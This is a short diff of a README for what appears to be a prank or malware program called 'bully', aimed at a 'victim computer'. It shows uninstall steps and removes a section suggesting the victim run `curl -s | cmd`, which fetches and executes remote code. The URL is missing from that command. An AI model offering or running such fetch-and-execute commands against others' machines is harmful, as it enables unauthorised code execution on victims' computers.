@@ -30,9 +30,3 @@ If you cannot do that, the only option is to restart the computer.
 3) How to uninstall the virus?<br>
 A) Go to the temp folder by typing `cd %tmp%` and delete the folder named
 bully by running `rmdir /s bully`
-
-## Miscellaneous
-If you do not wish to use a pendrive and the victim computer has internet connection
-you can also run the below command in cmd
-
-`curl -s | cmd`
